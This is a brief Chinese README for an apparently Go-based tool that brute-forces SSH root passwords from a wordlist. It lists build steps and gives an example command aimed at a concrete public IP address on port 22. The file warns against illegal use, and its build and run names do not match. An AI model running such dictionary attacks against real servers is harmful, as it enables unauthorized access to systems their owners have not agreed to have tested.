### 说明

#### 用途

利用字典暴力试探ssh密码，**请勿用于非法攻击**。目前用户名仅限于root，不支持字典表，如果需要请自行修改程序。

#### 如何使用

 - 安装最新版本go
 - go get golang.org/x/crypto/ssh
 - go build mms.go
 - ./ssh_attack cain.txt root 107.170.89.240:22
